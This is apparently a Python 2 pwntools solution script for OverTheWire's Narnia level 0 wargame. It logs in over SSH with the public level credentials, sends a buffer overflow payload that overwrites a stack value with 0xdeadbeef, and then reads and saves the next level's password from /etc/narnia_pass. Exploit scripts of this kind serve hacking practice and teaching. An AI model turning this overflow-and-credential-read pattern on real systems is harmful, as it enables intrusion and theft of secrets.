#!env python2

from pwn import *
import time
print("Starting pwnage...")
level_ = 0
host_ = 'narnia.labs.overthewire.org'
user_ = 'narnia{}'.format(level_)
chall_ = 'narnia%i' %level_
password_ = 'narnia0'
passfile_ = '/etc/narnia_pass/narnia%i' % (level_+1)
binary_ = '/narnia/%s' %chall_
shell_ = ssh(host=host_, user=user_, password=password_, port=2226)
#starting level0
shell_.interactive()
def get_in():
    return shell_.run(binary_)

def exploit(r):
    received = r.recvuntil("chance: ")
    log.info("ready...")
    payload = 'B' * 20 + p32(0xdeadbeef)
    log.info("payload is: {}".format(payload))
    r.sendline(payload)

def gtfo(r):
    time.sleep(0.5)
    r.clean()
    r.sendline("cat {}".format(passfile_))
    passwd = r.recvline()
    log.success("Found the following password: " +passwd)
    with open("narnia{}".format(level_+1), "w") as fh:
        fh.write(passwd)
print "Solving challenge: {}".format(chall_)
r = get_in()
exploit(r)
gtfo(r)
